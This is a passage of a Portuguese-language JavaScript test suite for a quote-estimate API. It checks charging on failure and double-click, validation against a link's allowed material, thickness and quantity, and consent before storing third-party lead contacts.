			arquivo: { nome: 'peca.svg', conteudo: SVG_QUADRADO },
		});

		expect(res.statusCode).toBe(402);
		expect(res.json()).toEqual({ message: 'orcamento_indisponivel' });
		// A resposta NÃO pode contar nada sobre a conta do profissional.
		expect(res.payload).not.toMatch(/saldo|vox|assinatura|insufficient/i);

		// O e-mail sai por `setImmediate`: esperamos um tick.
		await new Promise((r) => setImmediate(r));
		expect(espiao.emails).toEqual([
			{ para: 'dono@example.com', slug: SLUG, titulo: 'Orçamento na hora' },
		]);
		await app.close();
	});

	it('falha de INFRA (503) também vira 402 neutro, mas sem e-mail', async () => {
		const espiao = montaDeps();
		espiao.proximaCobranca.modo = 'erro';
		const app = await montaApp(espiao.deps);
		const res = await postEstimate(app, {
			campos: camposValidos(espiao),
			arquivo: { nome: 'peca.svg', conteudo: SVG_QUADRADO },
		});
		expect(res.statusCode).toBe(402);
		await new Promise((r) => setImmediate(r));
		// Não é problema do dono: não enchemos a caixa dele.
		expect(espiao.emails).toHaveLength(0);
		await app.close();
	});

	it('duplo-clique (mesmo arquivo e mesmas opções) cobra UMA vez', async () => {
		const espiao = montaDeps();
		const app = await montaApp(espiao.deps);

		const um = await postEstimate(app, {
			campos: camposValidos(espiao),
			arquivo: { nome: 'peca.svg', conteudo: SVG_QUADRADO },
		});
		const dois = await postEstimate(app, {
			campos: camposValidos(espiao),
			arquivo: { nome: 'peca.svg', conteudo: SVG_QUADRADO },
		});

		expect(um.statusCode).toBe(200);
		expect(dois.statusCode).toBe(200);
		// Mesmo preço nas duas (o cálculo é determinístico) …
		expect(dois.json().price_total_cents).toBe(um.json().price_total_cents);
		// … e uma única cobrança e um único lead.
		expect(espiao.cobrancas).toHaveLength(1);
		expect(espiao.leads).toHaveLength(1);
		await app.close();
	});

	it('mudar a quantidade é pedido NOVO e cobra de novo', async () => {
		const espiao = montaDeps();
		const app = await montaApp(espiao.deps);
		await postEstimate(app, {
			campos: camposValidos(espiao, { qtd: '10' }),
			arquivo: { nome: 'peca.svg', conteudo: SVG_QUADRADO },
		});
		await postEstimate(app, {
			campos: camposValidos(espiao, { qtd: '20' }),
			arquivo: { nome: 'peca.svg', conteudo: SVG_QUADRADO },
		});
		expect(espiao.cobrancas).toHaveLength(2);
		await app.close();
	});
});

/* ═══════════════════ 11. O que o link oferece ═══════════════════ */

describe('validação contra o cardápio do link', () => {
	it('material fora do que o link permite → 400 e nada cobrado', async () => {
		const espiao = montaDeps();
		const app = await montaApp(espiao.deps);
		const res = await postEstimate(app, {
			campos: camposValidos(espiao, { material: 'titânio' }),
			arquivo: { nome: 'peca.svg', conteudo: SVG_QUADRADO },
		});
		expect(res.statusCode).toBe(400);
		expect(espiao.cobrancas).toHaveLength(0);
		await app.close();
	});

	it('espessura fora do que o link permite → 400', async () => {
		const espiao = montaDeps();
		const app = await montaApp(espiao.deps);
		const res = await postEstimate(app, {
			campos: camposValidos(espiao, { espessura_mm: '18' }),
			arquivo: { nome: 'peca.svg', conteudo: SVG_QUADRADO },
		});
		expect(res.statusCode).toBe(400);
		await app.close();
	});

	it('quantidade acima do teto do link → 400', async () => {
		const espiao = montaDeps();
		const app = await montaApp(espiao.deps);
		const res = await postEstimate(app, {
			campos: camposValidos(espiao, { qtd: '999999' }),
			arquivo: { nome: 'peca.svg', conteudo: SVG_QUADRADO },
		});
		expect(res.statusCode).toBe(400);
		await app.close();
	});

	it('lead exigido sem consentimento → 400, antes de cobrar', async () => {
		// O contato é de um TERCEIRO que nunca aceitou nada com a gente. Sem o
		// "sim" explícito não se grava — e a recusa vem antes da cobrança, senão
		// o dono pagaria por um orçamento que não podemos entregar com lead.
		const espiao = montaDeps();
		const app = await montaApp(espiao.deps);
		const res = await postEstimate(app, {
			campos: camposValidos(espiao, { consentimento: 'false' }),
			arquivo: { nome: 'peca.svg', conteudo: SVG_QUADRADO },
		});
		expect(res.statusCode).toBe(400);
		expect(espiao.cobrancas).toHaveLength(0);
		expect(espiao.leads).toHaveLength(0);
		await app.close();
	});

	it('lead exigido sem nome/whatsapp → 400', async () => {
		const espiao = montaDeps();
		const app = await montaApp(espiao.deps);
		const campos = camposValidos(espiao);
		campos.nome = '';
		const res = await postEstimate(app, {
			campos,
			arquivo: { nome: 'peca.svg', conteudo: SVG_QUADRADO },
		});
		expect(res.statusCode).toBe(400);
		await app.close();
	});

	it('link sem lead não grava contato nenhum', async () => {
		const espiao = montaDeps();
		espiao.link = linkEntry({ pedir_lead: false });
		const app = await montaApp(espiao.deps);
		const res = await postEstimate(app, {
			campos: camposValidos(espiao),
			arquivo: { nome: 'peca.svg', conteudo: SVG_QUADRADO },
		});
		expect(res.statusCode).toBe(200);
		expect(espiao.leads).toHaveLength(0);
		await app.close();
	});

	it('sem `mostrar_prazo`, o prazo não sai na resposta', async () => {
		const espiao = montaDeps();
		espiao.link = linkEntry({ mostrar_prazo: false });
		const app = await montaApp(espiao.deps);
		const res = await postEstimate(app, {
			campos: camposValidos(espiao),
			arquivo: { nome: 'peca.svg', conteudo: SVG_QUADRADO },
		});
		expect(res.json().prazo_dias).toBeUndefined();
		await app.close();
	});
});
